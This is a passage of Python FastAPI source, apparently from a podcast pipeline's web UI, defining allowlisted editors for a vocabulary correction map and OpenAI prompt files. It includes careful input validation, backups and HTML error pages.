        paths.append(
            {
                "key": key,
                "filename": os.path.basename(str(raw)),
                "exists": os.path.isfile(str(raw)),
            }
        )

    return {
        "settings": settings,
        "paths": paths,
        "podcast_dir": podcast_dir_from_env(),
        "host": host_from_env(),
        "port": port_from_env(),
        "note": (
            "Only allowlisted settings are shown. API keys and tokens are never "
            "read by this page, in any form."
        ),
    }


def _read_text_or_none(path: Optional[str]) -> Optional[str]:
    """Read a text file, or None when it is missing or not text."""
    if not path or not os.path.isfile(path):
        return None
    try:
        with open(path, "rb") as handle:
            raw = handle.read()
    except OSError:
        return None
    try:
        return raw.decode("utf-8")
    except UnicodeDecodeError:
        return raw.decode("utf-8", errors="replace")


def _get_job_or_404(request: Request, job_id: str) -> Dict[str, Any]:
    """Look ``job_id`` up in the queue, or raise 404.

    Like ``base_name``, a job id is a lookup key. It reaches the filesystem in
    exactly one place - :func:`webui.jobs.events_path` - which re-checks it
    against a single-safe-segment pattern rather than trusting this route.
    """
    conn = _queue_or_503(request)
    job = jobs.get_job(conn, job_id)
    if job is None:
        raise HTTPException(status_code=404, detail="Job not found")
    return job


# ---------------------------------------------------------------------------
# Editors for the pipeline's INPUT files (ADR-008 phase 3, TASK-004)
#
# Two kinds of file here are written by a human and read by the pipeline:
#
#   vocabulary.json   the global correction map (ADR-006)
#   prompts/*.txt     the instruction text each OpenAI step sends
#
# That they are *input* is what makes them editable here at all. ADR-009 drew
# the line: a generated artifact is regenerable and is written with
# backup=False; human input is not regenerable and is written with backup=True.
# A correction made on this page therefore survives a re-run - the next run
# reproduces it instead of overwriting it (TASK-004 AC #4 and #5). Nothing in
# this section writes an episode artifact, and nothing in it starts a job: the
# "apply it" forms post to /api/jobs like every other button in this app.
#
# ADR-004 stays intact too. Editing the vocabulary map edits *data* that
# deterministic code applies; no prompt here rewrites a transcript wholesale.
#
# Security
# --------
# The editable set is a fixed allowlist derived from :mod:`whycast.config`. A
# request names a *key* of that allowlist, never a path; the path comes from
# the config constant. There is no traversal to defend against: an unknown key
# is a 404 before any filesystem call happens at all. Same shape as ``kind``
# and ``fmt`` on the artifact route.
#
# The constants are read through the module object, not imported by value.
# ``whycast.config`` computes them at import time from the repository root and
# offers no environment override, so a ``from ... import VOCABULARY_FILE``
# would freeze the operator's real file into this module - and a test could not
# point it anywhere else, which means the test suite would edit the live
# vocabulary. Reading ``whycast_config.VOCABULARY_FILE`` per request costs one
# attribute lookup and keeps these routes testable against a temp directory.
#
# No configuration *value* leaves this module. Paths are rendered relative to
# the repository root (:func:`_display_path`), which drops the machine's
# directory layout, and nothing here reads ``os.environ``.
# ---------------------------------------------------------------------------

#: Largest editor body accepted. A prompt is a few kilobytes and the vocabulary
#: map a few hundred lines; half a megabyte is far past anything legitimate and
#: well under what would be worth streaming. Same reasoning as
#: :data:`MAX_JOB_BODY_BYTES`, a different number because prompts are prose.
MAX_EDITOR_BODY_BYTES = 512 * 1024

#: The 413 an editor answers with. See :data:`_JOB_BODY_TOO_LARGE`.
_EDITOR_BODY_TOO_LARGE = f"That is larger than {MAX_EDITOR_BODY_BYTES} bytes."

#: The allowlist. Each entry names a ``whycast.config`` attribute - never a
#: path, never anything derived from a request - plus the job type that re-runs
#: the step this prompt drives.
#:
#: ``speaker_analysis_prompt.txt`` exists on disk and is read by
#: :mod:`whycast.pipeline.speakers`, but has no constant in
#: :mod:`whycast.config`; it is resolved there from a directory name and a
#: literal. It is therefore *not* in this list - adding it would mean building
#: a path in this module, which is the one thing ADR-008 forbids here. The
#: prompts page says so rather than implying the list is complete.
#:
#: ``speaker_unknown_attribution_prompt.txt`` used to belong in that sentence
#: too. It no longer does: nothing reads it. The attribution step sent it to
#: gpt-4o and then ignored the answer, deciding every case from
#: ``previous_speaker == next_speaker`` instead, so the call was removed
#: (:func:`whycast.pipeline.speakers.attribute_unknown_speakers`). The file is
#: inert, which is the reason not to offer it here: an editable prompt that
#: changes nothing is a worse lie than an absent one.
PROMPT_SPECS: Tuple[Dict[str, str], ...] = (
    {
        "name": "cleanup",
        "config_attr": "PROMPT_CLEANUP_FILE",
        "label": "Cleanup",
        "produces": "the cleaned transcript",
        "description": (
            "Turns the raw transcript into the cleaned one: filler words out, "
            "punctuation and grammar fixed. Every later step reads its output, "
            "so a change here moves the summary and the blog too."
        ),
        "job_type": "postprocess",
    },
    {
        "name": "summary",
        "config_attr": "PROMPT_SUMMARY_FILE",
        "label": "Summary",
        "produces": "the summary artifact",
        "description": (
            "Writes the summary from the cleaned transcript. Long episodes are "
            "summarised in chunks with this same prompt."
        ),
        "job_type": "postprocess",
    },
    {
        "name": "blog",
        "config_attr": "PROMPT_BLOG_FILE",
        "label": "Blog",
        "produces": "the blog artifact",
        "description": (
            "Writes the blog post from the cleaned transcript and the summary "
            "together."
        ),
        "job_type": "postprocess",
    },
    {
        "name": "blog_alt1",
        "config_attr": "PROMPT_BLOG_ALT1_FILE",
        "label": "Blog (alternative)",
        "produces": "the blog_alt1 artifact",
        "description": (
            "A second blog voice. The pipeline checks whether this file exists "
            "and skips the step when it does not, so saving it here is what "
            "switches the step on - and an empty file would switch it off again."
        ),
        "job_type": "postprocess",
    },
    {
        "name": "history",
        "config_attr": "PROMPT_HISTORY_EXTRACT_FILE",
        "label": "History extract",
        "produces": "the history artifact",
        "description": (
            "Pulls the historical references out of the cleaned transcript."
        ),
        "job_type": "postprocess",
    },
    {
        "name": "speaker_assignment",
        "config_attr": "PROMPT_SPEAKER_ASSIGN_FILE",
        "label": "Speaker assignment",
        "produces": "the speaker_assignment artifact",
        "description": (
            "Asks the model which real name belongs to each SPEAKER_xx label. "
            "Per ADR-004 it only produces the judgement; deterministic code "
            "applies the mapping to the transcript."
        ),
        "job_type": "speakers",
    },
)

#: Names only, as a set, for the O(1) rejection of anything else.
PROMPT_NAMES = tuple(spec["name"] for spec in PROMPT_SPECS)

#: The job that makes an edited ``vocabulary.json`` take effect for one episode.
#:
#: It is the expensive one, and that is not a choice made here - it is what the
#: file does. :mod:`whycast.pipeline.transcription` reads ``vocabulary.json``
#: once, at the start of a transcription, and hands the terms to Whisper as a
#: word list. It changes how the *audio is heard*; it does not rewrite text that
#: has already been transcribed. So applying it to an episode that is already
#: done means transcribing the audio again, which is ``force_episode``: GPU time
#: plus every OpenAI step, paid. The page says this in those words rather than
#: offering a cheap-looking button that would do nothing.
VOCABULARY_APPLY_JOB = "force_episode"


class _EditorRejected(Exception):
    """A save this app refuses to write, with a message for the operator.

    Separate from :class:`HTTPException` because the same rejection is rendered
    two ways: as JSON for the API, and as the editor page with the text still
    in the textarea for a browser. Raising it means *nothing was written* - the
    file on disk is untouched.
    """


def _display_path(path: str) -> str:
    """``path`` relative to the repository root, or just its filename.

    What the UI shows instead of an absolute path. A repo-relative name
    (``prompts/summary_prompt.txt``) identifies the file exactly without
    publishing where this checkout lives, and a path outside the repository -
    which is what a test's temp directory is - degrades to the bare filename
    rather than leaking a machine path or raising ``ValueError`` on Windows
    when the two are on different drives.
    """
    if not path:
        return ""
    try:
        rel = os.path.relpath(path, REPO_ROOT)
    except ValueError:
        return os.path.basename(path)
    if rel.startswith(".."):
        return os.path.basename(path)
    return rel.replace(os.sep, "/")


def _file_state(path: str) -> Dict[str, Any]:
    """What the editor knows about one file on disk.

    Deliberately contains no absolute path: ``display_path`` is what the
    templates and the API show. ``readable`` is false for a file that is not
    valid UTF-8 - the editor refuses to show it rather than round-tripping
    mojibake back onto disk through the textarea.
    """
    state: Dict[str, Any] = {
        "display_path": _display_path(path),
        "filename": os.path.basename(path),
        "exists": False,
        "size": None,
        "mtime": None,
        "has_backup": False,
        "readable": True,
        "text": "",
        "error": None,
    }
    try:
        stat = os.stat(path)
    except OSError:
        return state
    state["exists"] = True
    state["size"] = stat.st_size
    state["mtime"] = stat.st_mtime
    state["has_backup"] = os.path.isfile(path + BACKUP_SUFFIX)
    try:
        with open(path, "r", encoding="utf-8") as handle:
            state["text"] = handle.read()
    except UnicodeDecodeError:
        state["readable"] = False
        state["error"] = (
            f"{state['display_path']} is not valid UTF-8. Editing it here would "
            f"rewrite the bytes it could not decode, so it is shown as empty "
            f"and saving is refused until it is fixed outside this UI."
        )
    except OSError as exc:
        state["readable"] = False
        state["error"] = f"Could not read {state['display_path']}: {exc.strerror or exc}"
    return state


def _normalise_newlines(text: str) -> str:
    """CRLF and bare CR to LF.

    A ``<textarea>`` posts CRLF per the HTML spec, and ``atomic_write_text``
    defaults to the platform translation - so on Windows a round-trip would
    write ``\\r\\r\\n`` and grow a carriage return per save. Normalising here
    and writing with ``newline="\\n"`` makes a save idempotent.
    """
    return text.replace("\r\n", "\n").replace("\r", "\n")


def _reject_duplicate_keys(pairs: List[Tuple[str, Any]]) -> Dict[str, Any]:
    """``object_pairs_hook`` that refuses a repeated key.

    ``json.loads`` keeps the last of a duplicate pair and says nothing, so a
    vocabulary file with ``"WAI"`` twice silently loses one of the two
    corrections and the operator has no way to see it. This is the only place
    that can notice.
    """
    result: Dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise _EditorRejected(
                f"The key {key!r} appears more than once. JSON keeps only the "
                f"last one, so one of your corrections would be silently "
                f"dropped. Remove the duplicate."
            )
        result[key] = value
    return result


def _validated_vocabulary(text: str) -> Tuple[Dict[str, str], str]:
    """Check an edited ``vocabulary.json`` and return ``(mapping, canonical)``.

    Nothing is written until this returns. The file is read at the start of
    every transcription (:mod:`whycast.pipeline.transcription`), and the loader
    answers a malformed file with an empty mapping and a log line - so a broken
    save would quietly disable every correction on every later run. That is
    what this refuses to allow.

    What is rejected, and why each one matters:

    * not valid JSON, or not an object - the loader would return ``{}``;
    * a key that is empty or only whitespace - the correction step builds
      ``re.escape(key)`` into ``\\b...\\b``, and an empty key gives the pattern
      ``\\b\\b``, which matches at *every* word boundary and would splatter the
      replacement through the entire transcript;
    * a value that is not a string - the loader drops the entry;
    * a duplicate key - JSON silently keeps the last.

    Returns the parsed mapping and the canonical text to write: re-serialised
    with two-space indent and a trailing newline, insertion order preserved so
    the operator's grouping survives. Writing the canonical form rather than the
    submitted bytes is what makes "the file on disk is always loadable" a
    property of the code instead of a thing that was checked once.
    """
    if not text.strip():
        raise _EditorRejected(
            "The vocabulary is empty. An empty file is not valid JSON; write "
            "{} if you really mean 'no corrections'."
        )
    try:
        parsed = json.loads(text, object_pairs_hook=_reject_duplicate_keys)
    except _EditorRejected:
        raise
    except json.JSONDecodeError as exc:
        raise _EditorRejected(
            f"This is not valid JSON: {exc.msg} (line {exc.lineno}, column "
            f"{exc.colno}). Nothing was written; the file on disk is unchanged."
        ) from None
    except RecursionError:
        # Deeply nested JSON. RecursionError is neither ValueError nor
        # JSONDecodeError, so it used to escape this function entirely and the
        # operator got "Internal Server Error" from the one editor that exists
        # to tell them exactly what is wrong with their paste.
        raise _EditorRejected(
            "This JSON is nested too deeply to parse. The vocabulary is a flat "
            "object mapping a wrong spelling to the right one; nothing was "
            "written and the file on disk is unchanged."
        ) from None
    except ValueError as exc:  # pragma: no cover - json raises JSONDecodeError
        raise _EditorRejected(f"This is not valid JSON: {exc}") from None

    if not isinstance(parsed, dict):
        raise _EditorRejected(
            "The vocabulary must be a JSON object mapping a wrong spelling to "
            f"the right one, like {{\"WAIcast\": \"WHYcast\"}} - this is "
            f"{type(parsed).__name__}."
        )

    for key, value in parsed.items():
        if not isinstance(key, str) or not key.strip():
            raise _EditorRejected(
                "One of the keys is empty. An empty key becomes a pattern that "
                "matches at every word boundary, which would insert its "
                "replacement throughout the whole transcript. Remove it."
            )
        if not isinstance(value, str):
            raise _EditorRejected(
                f"The value for {key!r} is {type(value).__name__}, not text. "
                f"Every correction maps text to text; the pipeline drops "
                f"anything else and the entry would silently do nothing."
            )

    mapping = {str(key): str(value) for key, value in parsed.items()}
    canonical = json.dumps(mapping, indent=2, ensure_ascii=False) + "\n"
    # The last thing that can still fail is turning it into bytes. A lone
    # UTF-16 surrogate written as "\ud800" is legal JSON *source* and becomes a
    # str that no validator here objects to - but there is no UTF-8 for it, so
    # the write raised UnicodeEncodeError past every `except` on the way out.
    # Checked on the canonical text rather than the submitted text because this
    # is where the escape sequence has become the character.
    try:
        canonical.encode("utf-8")
    except UnicodeEncodeError as exc:
        raise _EditorRejected(
            f"This cannot be written as UTF-8: {exc.reason} at position "
            f"{exc.start}. A lone surrogate escape such as \\ud800 is valid "
            f"JSON but not a character any file can hold. Nothing was written; "
            f"the file on disk is unchanged."
        ) from None
    return mapping, canonical


def _validated_prompt(text: str, spec: Dict[str, str]) -> str:
    """Check an edited prompt and return the text to write.

    A prompt is free-form instruction text, so there is exactly one rule worth
    enforcing: it may not be empty. Every step does ``if not prompt: skip``
    (see :mod:`whycast.pipeline.postprocess`), so saving an empty file does not
    produce a bad artifact - it silently produces no artifact at all, which is
    much harder to notice.
    """
    cleaned = _normalise_newlines(text)
    if not cleaned.strip():
        raise _EditorRejected(
            f"The {spec['label'].lower()} prompt is empty. The pipeline skips a "
            f"step whose prompt file is empty, so this would not change "
            f"{spec['produces']} - it would stop it being produced at all. "
            f"Delete the file outside this UI if that is what you want."
        )
    control = _PROMPT_CONTROL_CHARS.search(cleaned)
    if control:
        raise _EditorRejected(
            f"This prompt contains a control character (0x"
            f"{ord(control.group()):02x}) at position {control.start()}. A "
            f"prompt is plain text; a stray NUL from a paste is not visible "
            f"here but is sent verbatim to the paid OpenAI API, where it "
            f"fails - after a GPU transcription may already have been paid "
            f"for. Nothing was written; the file on disk is unchanged."
        )
    if not cleaned.endswith("\n"):
        cleaned += "\n"
    return cleaned


def _prompt_spec_or_404(name: str) -> Dict[str, Any]:
    """The allowlist entry called ``name``, resolved to a path, or 404.

    The whole path-safety story of the prompt editor is these four lines. The
    request supplies a dictionary key; the path is whatever
    :mod:`whycast.config` says it is. A name that is not in the allowlist never
    reaches the filesystem.
    """
    for spec in PROMPT_SPECS:
        if spec["name"] == name:
            resolved = dict(spec)
            resolved["path"] = getattr(whycast_config, spec["config_attr"])
            return resolved
    raise HTTPException(
        status_code=404,
        detail=(
            f"Unknown prompt {name!r}. Editable prompts: " + ", ".join(PROMPT_NAMES)
        ),
    )


def _prompt_overview() -> List[Dict[str, Any]]:
    """Every allowlisted prompt with its file state, for the list page."""
    catalogue = {entry["type"]: entry for entry in job_types_payload()}
    out: List[Dict[str, Any]] = []
    for spec in PROMPT_SPECS:
        path = getattr(whycast_config, spec["config_attr"])
        entry = dict(spec)
        entry.update(_file_state(path))
        entry["job"] = catalogue.get(spec["job_type"])
        out.append(entry)
    return out


def _job_spec(job_type: str) -> Optional[Dict[str, Any]]:
    """One entry of the job catalogue, with its ``cost`` and ``gpu`` flags.

    Read from :func:`job_types_payload` - the same source the enqueue route
    validates against - so a page cannot advertise a job as free that the API
    charges for.
    """
    for entry in job_types_payload():
        if entry["type"] == job_type:
            return entry
    return None


def _apply_targets(conn: sqlite3.Connection, audio_only: bool) -> List[Dict[str, Any]]:
    """Episodes offered in an "apply this to one episode" picker.

    ``audio_only`` for the vocabulary: that edit only takes effect by
    transcribing the audio again, so an episode without audio cannot be a
    target and is not offered.
    """
    episodes = db.list_episodes(conn)
    if audio_only:
        return [ep for ep in episodes if ep.get("audio_path")]
    return episodes


async def _editor_payload(request: Request) -> Dict[str, Any]:
    """Read ``{"text": ...}`` from a JSON or form-encoded body.

    Both shapes for the same reason the job routes accept both: a plain
    ``<form method="post">`` works with scripting off and posts
    ``application/x-www-form-urlencoded``; anything scripted posts JSON.

    Raises:
        HTTPException: 413 when the body is over :data:`MAX_EDITOR_BODY_BYTES`,
            400 when it is not an object with a ``text`` field.
    """
    body = await _read_capped_body(
        request, MAX_EDITOR_BODY_BYTES, _EDITOR_BODY_TOO_LARGE
    )
    if _is_form_request(request):
        return dict(_form_fields(body))

    if not body.strip():
        return {}
    try:
        payload = json.loads(body)
    except ValueError:
        raise HTTPException(
            status_code=400, detail='Body must be JSON: {"text": "..."}'
        ) from None
    if not isinstance(payload, dict):
        raise HTTPException(status_code=400, detail="Body must be a JSON object")
    return payload


def _submitted_text(payload: Dict[str, Any]) -> str:
    """The ``text`` field of an editor save, or a 400.

    "A string" is checked twice, because Python's idea of a string is wider
    than a file's. ``json.loads`` happily produces a ``str`` containing a lone
    UTF-16 surrogate from ``"\\ud800"``; it passes every validator, survives
    ``json.dumps(ensure_ascii=False)``, and only fails at the very last step,
    inside :func:`whycast.io_utils.atomic_write_text`, as a
    ``UnicodeEncodeError`` that ``_write_input_file``'s ``except OSError`` does
    not catch - so the operator got an opaque 500 and a traceback in the server
    log, from an editor whose whole job is to answer a bad paste with the line
    and column. Refusing it here keeps the promise the editors make: a rejected
    save explains itself and leaves the file byte-identical.
    """
    text = payload.get("text")
    if not isinstance(text, str):
        raise HTTPException(
            status_code=400,
            detail='A "text" field is required and must be a string.',
        )
    try:
        text.encode("utf-8")
    except UnicodeEncodeError as exc:
        raise HTTPException(
            status_code=400,
            detail=(
                f"This text cannot be written as UTF-8: {exc.reason} at "
                f"position {exc.start}. Nothing was written; the file on disk "
                f"is unchanged."
            ),
        ) from None
    return text


def _wants_html(request: Request) -> bool:
    """True for a browser form post, false for the API.

    Same test the error handler uses. It decides how a save answers: a browser
    gets a redirect back to the page it came from (so the Back button is not
    the only way out of a JSON document), the API gets JSON.
    """
    return "text/html" in (request.headers.get("accept") or "")


def _write_input_file(path: str, text: str) -> Dict[str, Any]:
    """Write a human-authored input file, keeping the previous version.

    ``backup=True`` is the ADR-009 rule for this side of the line: an artifact
    is regenerable and is written without a backup, a file a person typed is
    not. ``newline="\\n"`` pairs with :func:`_normalise_newlines`; without it the
    platform translation would add a carriage return per save on Windows.

    Raises:
        HTTPException: 500 when the write fails. ``atomic_write_text`` writes a
            temp file and renames, so a failure leaves the previous contents in
            place rather than a half-written file.
    """
    try:
        atomic_write_text(path, text, backup=True, newline="\n")
    except OSError as exc:
        logger.error("Could not write %s: %s", path, exc)
        raise HTTPException(
            status_code=500,
            detail=(
                f"Could not write {_display_path(path)}: {exc.strerror or exc}. "
                f"The previous contents are still on disk."
            ),
        ) from None
    except UnicodeEncodeError as exc:
        # Defence in depth: the validators refuse unencodable text with a 400
        # long before this. If one ever misses a case, the operator should
        # still get a sentence rather than a traceback. The encode fails before
        # the temp file is committed, so the target and its backup are both
        # untouched, which is what the message may safely promise.
        logger.error("Could not encode %s as UTF-8: %s", path, exc)
        raise HTTPException(
            status_code=500,
            detail=(
                f"Could not write {_display_path(path)}: the text is not "
                f"encodable as UTF-8 ({exc.reason}). Nothing was written; the "
                f"previous contents and their backup are both untouched."
            ),
        ) from None
    logger.info("Wrote %s (backup kept as %s)", path, path + BACKUP_SUFFIX)
    return _file_state(path)


def _register_editor_routes(app: FastAPI, templates: Jinja2Templates) -> None:
    """The vocabulary and prompt editors, and their JSON API.

    Every route in here is either a read or a write of one allowlisted input
    file. None of them runs a pipeline step; "apply it to an episode" is a form
    that posts to ``/api/jobs`` exactly like the buttons on the episode page,
    so cost stays a property of the job type and is warned about in one place.
    """

    # -- vocabulary ---------------------------------------------------------

    def vocabulary_context(
        request: Request,
        text: Optional[str] = None,
        error: Optional[str] = None,
        saved: bool = False,
    ) -> Dict[str, Any]:
        conn = _conn(request)
        state = _file_state(whycast_config.VOCABULARY_FILE)
        if not state["exists"] and not state["text"]:
            # No file yet. An empty textarea would be a trap: an empty save is
            # refused (it is not valid JSON), so the first thing an operator
            # could do here would fail. Seed the empty map instead.
            state["text"] = "{}\n"
        # On a rejected save the operator's own text goes back into the
        # textarea, not the file's - losing an edit to a typo would be its own
        # small betrayal.
        state["text"] = state["text"] if text is None else text
        entry_count: Optional[int] = None
        if state["readable"]:
            try:
                parsed = json.loads(state["text"] or "{}")
                if isinstance(parsed, dict):
                    entry_count = len(parsed)
            except ValueError:
                entry_count = None
        return {
            "vocab": state,
            "entry_count": entry_count,
            "error": error or state["error"],
            "saved": saved,
            "apply_job": _job_spec(VOCABULARY_APPLY_JOB),
            "episodes": _apply_targets(conn, audio_only=True),
            "backup_suffix": BACKUP_SUFFIX,
            "meta": _public_meta(db.get_meta(conn)),
        }

    @app.get("/vocabulary", response_class=HTMLResponse, name="vocabulary_editor")
    async def vocabulary_editor(request: Request, saved: Optional[str] = Query(None)):
        """Edit ``vocabulary.json``: the global correction map (ADR-006)."""
        return templates.TemplateResponse(
            request, "vocabulary.html", vocabulary_context(request, saved=saved == "1")
        )

    @app.get("/api/vocabulary", name="api_vocabulary")
    async def api_vocabulary(request: Request):
        """The vocabulary file as text, plus what is known about it on disk."""
        state = _file_state(whycast_config.VOCABULARY_FILE)
        entries: Optional[int] = None
        if state["readable"] and state["text"].strip():
            try:
                parsed = json.loads(state["text"])
            except ValueError:
                parsed = None
            if isinstance(parsed, dict):
                entries = len(parsed)
        return {
            "file": state["display_path"],
            "exists": state["exists"],
            "readable": state["readable"],
            "size": state["size"],
            "mtime": state["mtime"],
            "has_backup": state["has_backup"],
            "entry_count": entries,
            "text": state["text"],
            "apply_job": _job_spec(VOCABULARY_APPLY_JOB),
        }

    @app.post("/api/vocabulary", name="api_vocabulary_save")
    async def api_vocabulary_save(request: Request):
        """Validate and write ``vocabulary.json``, keeping a ``.bak``.

        Validation happens before anything is opened for writing, so a rejected
        save leaves the file byte-identical. See :func:`_validated_vocabulary`
        for what is refused and why each rule is there.
        """
        payload = await _editor_payload(request)
        text = _submitted_text(payload)
        try:
            mapping, canonical = _validated_vocabulary(_normalise_newlines(text))
        except _EditorRejected as exc:
            message = str(exc)
            logger.info("Refused a vocabulary save: %s", message)
            if _wants_html(request):
                return templates.TemplateResponse(
                    request,
                    "vocabulary.html",
                    vocabulary_context(request, text=text, error=message),
                    status_code=400,
                )
            raise HTTPException(status_code=400, detail=message) from None

        state = _write_input_file(whycast_config.VOCABULARY_FILE, canonical)
        if _wants_html(request):
            return RedirectResponse("/vocabulary?saved=1", status_code=303)
        return {
            "saved": True,
            "file": state["display_path"],
            "entry_count": len(mapping),
            "has_backup": state["has_backup"],
            "next": (
                "Nothing runs by itself. The terms are read at the start of the "
                "next transcription and handed to Whisper as a word list."
            ),
        }

    # -- prompts ------------------------------------------------------------

    def prompts_context(
        request: Request,
        selected: Optional[Dict[str, Any]] = None,
        text: Optional[str] = None,
        error: Optional[str] = None,
        saved: bool = False,
    ) -> Dict[str, Any]:
        conn = _conn(request)
        state: Optional[Dict[str, Any]] = None
        if selected is not None:
            state = dict(selected)
            state.update(_file_state(selected["path"]))
            state["text"] = state["text"] if text is None else text
            state["job"] = _job_spec(selected["job_type"])
            # The absolute path is used to read the file and then dropped; the
            # template only ever sees display_path.
            state.pop("path", None)
            state.pop("config_attr", None)
        return {
            "prompts": _prompt_overview(),
            "prompt": state,
            "error": error or (state or {}).get("error"),
            "saved": saved,
            "episodes": _apply_targets(conn, audio_only=False),
            "backup_suffix": BACKUP_SUFFIX,
            "meta": _public_meta(db.get_meta(conn)),
        }

    @app.get("/prompts", response_class=HTMLResponse, name="prompts_editor")
    async def prompts_editor(request: Request):
        """The prompts that can be edited here, and what each one drives."""
        return templates.TemplateResponse(request, "prompts.html", prompts_context(request))

    @app.get("/prompts/{name}", response_class=HTMLResponse, name="prompt_editor")
    async def prompt_editor(
        request: Request, name: str, saved: Optional[str] = Query(None)
    ):
        """One prompt file, open for editing.

        ``name`` is an allowlist key. It is looked up, never joined onto a
        directory; anything not in :data:`PROMPT_NAMES` is a 404 that never
        touches the filesystem.
        """
        spec = _prompt_spec_or_404(name)
        return templates.TemplateResponse(
            request,
            "prompts.html",
            prompts_context(request, selected=spec, saved=saved == "1"),
        )

    @app.get("/api/prompts", name="api_prompts")
    async def api_prompts():
        """The editable prompt files. The list is fixed; a request cannot add to it."""
        return {
            "count": len(PROMPT_SPECS),
            "prompts": [
                {
                    "name": entry["name"],
                    "label": entry["label"],
                    "description": entry["description"],
                    "produces": entry["produces"],
                    "file": entry["display_path"],
                    "exists": entry["exists"],
                    "readable": entry["readable"],
                    "size": entry["size"],
                    "mtime": entry["mtime"],
                    "has_backup": entry["has_backup"],
                    "job": entry["job"],
                }
                for entry in _prompt_overview()
            ],
        }

    @app.get("/api/prompts/{name}", name="api_prompt")
    async def api_prompt(request: Request, name: str):
        """One prompt file's text and state."""
        spec = _prompt_spec_or_404(name)
        state = _file_state(spec["path"])
        return {
            "name": spec["name"],
            "label": spec["label"],
            "description": spec["description"],
            "produces": spec["produces"],
            "file": state["display_path"],
            "exists": state["exists"],
            "readable": state["readable"],
            "size": state["size"],
            "mtime": state["mtime"],
            "has_backup": state["has_backup"],
            "text": state["text"],
            "job": _job_spec(spec["job_type"]),
        }

    @app.post("/api/prompts/{name}", name="api_prompt_save")
    async def api_prompt_save(request: Request, name: str):
        """Write one prompt file, keeping a ``.bak``.

        The path comes from :mod:`whycast.config` via the allowlist; ``name``
        selects an entry and is never part of a path.
        """
        spec = _prompt_spec_or_404(name)
        payload = await _editor_payload(request)
        text = _submitted_text(payload)
        try:
            cleaned = _validated_prompt(text, spec)
        except _EditorRejected as exc:
            message = str(exc)
            logger.info("Refused a save of the %s prompt: %s", spec["name"], message)
            if _wants_html(request):
                return templates.TemplateResponse(
                    request,
                    "prompts.html",
                    prompts_context(request, selected=spec, text=text, error=message),
                    status_code=400,
                )
            raise HTTPException(status_code=400, detail=message) from None

        state = _write_input_file(spec["path"], cleaned)
        if _wants_html(request):
            return RedirectResponse(f"/prompts/{spec['name']}?saved=1", status_code=303)
        job = _job_spec(spec["job_type"])
        nxt = (
            "Nothing runs by itself. The next pipeline run that reaches this "
            "step reads the file from disk."
        )
        if job is not None:
            nxt += f' To apply it to one episode now, queue "{job["label"]}"'
            nxt += (
                " for that episode - it calls the paid OpenAI API."
                if job["cost"]
                else " for that episode."
            )
        return {
            "saved": True,
            "name": spec["name"],
            "file": state["display_path"],
            "size": state["size"],
            "has_backup": state["has_backup"],
            "job": job,
            "next": nxt,
        }


def _register_error_handlers(app: FastAPI, templates: Jinja2Templates) -> None:
    """Render HTTP errors as a page for browsers, as JSON for the API.

    Registered against ``starlette.exceptions.HTTPException``, not FastAPI's.
    FastAPI's class is a *subclass* of Starlette's, and Starlette's router
    raises the parent for the two errors a browser hits most - 404 on an
    unknown URL and 405 on a wrong method. Registering the subclass catches
    only errors raised inside handlers, which is why the custom page appeared
    for ``/episodes/nope`` but not for ``/nosuchpage``. Handling the parent
    covers both, since the subclass is an instance of it.
    """

    @app.exception_handler(StarletteHTTPException)
    async def http_exception_handler(request: Request, exc: StarletteHTTPException):
        wants_html = not request.url.path.startswith("/api/") and "text/html" in (
            request.headers.get("accept") or ""
        )
        if not wants_html:
            return JSONResponse(
                {"detail": exc.detail}, status_code=exc.status_code, headers=exc.headers
            )
        # Self-contained: error pages must not depend on a template existing.
        body = (
            "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
            f"<title>{exc.status_code}</title>"
            "<style>body{font-family:system-ui,sans-serif;margin:4rem auto;max-width:40rem;"
            "color:#222}a{color:#06c}</style></head><body>"
            f"<h1>{exc.status_code}</h1><p>{_escape(str(exc.detail))}</p>"
            "<p><a href=\"/\">Back to the episode overview</a></p></body></html>"
        )
        return HTMLResponse(body, status_code=exc.status_code, headers=exc.headers)


def _escape(text: str) -> str:
    """Minimal HTML escaping for the built-in error page."""
    return (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


#: Module-level application for ``uvicorn webui.app:app``. Reading environment
#: variables is the only thing this does at import time.
app = create_app()
